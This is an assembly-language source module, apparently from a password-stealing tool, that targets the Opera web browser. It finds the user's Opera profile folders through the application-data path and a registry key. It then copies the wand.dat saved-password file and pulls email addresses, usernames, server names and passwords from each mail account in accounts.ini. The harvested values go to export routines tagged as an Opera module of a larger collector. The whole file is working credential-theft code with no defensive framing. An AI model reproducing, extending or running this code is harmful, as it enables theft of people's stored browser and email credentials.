; Tested on Opera 7.51

.data
	@AllocStr	<szOperaPath0>, <"\Opera">
	@AllocStr	<szOperaPath1>,	<"\Mail\accounts.ini">
	@AllocStr	<szOperaPath2>,	<"\profile\wand.dat">
	@AllocStr	<szOperaReg>,	<"Software\Opera Software">
	@AllocStr	<szOperaRegKey>, <"Last Directory3">
	@AllocStr	<szOperaKey1>,	<"Email">
	@AllocStr	<szOperaKey2>,	<"Incoming Username">
	@AllocStr	<szOperaKey3>,	<"Incoming Servername">
	@AllocStr	<szOperaKey4>,	<"Incoming Password">
	@AllocStr	<szOperaSearch>, <"\*.*">
	@AllocMem	<lpOperaSections>, <8192>
	@AllocMem	<lpOperaCommonBuf>, <MAX_PATH+1>
	

.code

WriteOperaOutput proc lpKey, dwType: DWORD
	LOCAL	OutData[1024]: BYTE
	invoke	GetPrivateProfileString, edi, lpKey, offset szNilStr, addr OutData, 1023, offset lpOperaCommonBuf
	.IF	eax
		invoke	ExportStr, dwType, 0, addr OutData
	.ENDIF
	
	ret
WriteOperaOutput endp

; Scan directory for .dat files
GetOperaDats proc uses edi esi dwDoSearch: DWORD
	LOCAL   FindFileData: WIN32_FIND_DATA
	LOCAL   hFind: DWORD
	LOCAL	hMap: MappedFile
	
	.IF	dwDoSearch
		invoke	lstrlen, offset lpOperaCommonBuf
		lea	edi, [eax+offset lpOperaCommonBuf+1]        
		invoke	lstrcat, offset lpOperaCommonBuf, offset szOperaSearch
		        	
		invoke  FindFirstFile, offset lpOperaCommonBuf, addr FindFileData
		mov     hFind, eax
		inc     eax
		jz      @ret	
		
	@find_loop:                
		cmp	FindFileData.cFileName[0], '.'
		jz	@level_up_skip
		
		invoke	lstrcpy, edi, addr FindFileData.cFileName
		mov	esi, edi
	.ELSE
		mov	esi, offset lpOperaCommonBuf
        .ENDIF
        
        invoke	lstrlen, esi
        add	esi, eax 
        
        ; Wand
        invoke	lstrcpy, esi, offset szOperaPath2
	invoke	MapFile, offset lpOperaCommonBuf, addr hMap 
	.IF	eax
		invoke	ExportData, MODULE_OPERA_WAND, 0, hMap.lpMem, hMap.dwFileSize
	.ENDIF
	invoke	UnmapFile, addr hMap
         
        ; Email
        invoke	lstrcpy, esi, offset szOperaPath1
        push	edi
	mov	edi, offset lpOperaSections
	
	invoke  GetPrivateProfileSectionNames, edi, 8190, offset lpOperaCommonBuf
	test	eax, eax
	jz	@no_accounts
	
@l:
	invoke	ExportData, MODULE_OPERA_START, 0, 0, 0
	invoke	WriteOperaOutput, offset szOperaKey1, MODULE_OPERA_EMAIL
	invoke	WriteOperaOutput, offset szOperaKey2, MODULE_OPERA_EUSER
	invoke	WriteOperaOutput, offset szOperaKey3, MODULE_OPERA_ESERVER
	invoke	WriteOperaOutput, offset szOperaKey4, MODULE_OPERA_EPASS
	invoke	ExportData, MODULE_OPERA_END, 0, 0, 0
	@Next	@l
	
@no_accounts:
	pop	edi
               
        .IF	dwDoSearch
	@level_up_skip:
		invoke  FindNextFile, hFind, addr FindFileData
		test    eax, eax
		jnz	@find_loop
		invoke  FindClose, hFind
	.ENDIF

@ret:
	ret
GetOperaDats endp

GetOperaOutput proc
	LOCAL	lpBufLen: DWORD
	
	; Write header
	invoke	ExportModule, MODULE_OPERA
	
	; Get base folder
	.IF	dwSHGetFolderPath
		push	offset lpOperaCommonBuf
		push	0
		push	NULL
		push	CSIDL_APPDATA
		push	NULL
		call	dwSHGetFolderPath
		.IF	eax == S_OK
			mov	esi, offset lpOperaCommonBuf
			invoke	lstrcat, offset lpOperaCommonBuf, offset szOperaPath0
			invoke	GetOperaDats, TRUE
			
			mov	lpBufLen, 8191
			invoke	RegReadValue, HKEY_CURRENT_USER, offset szOperaReg, offset szOperaRegKey, offset lpOperaCommonBuf, addr lpBufLen
			invoke	GetOperaDats, FALSE
		.ENDIF
	.ENDIF
	
	ret
GetOperaOutput endp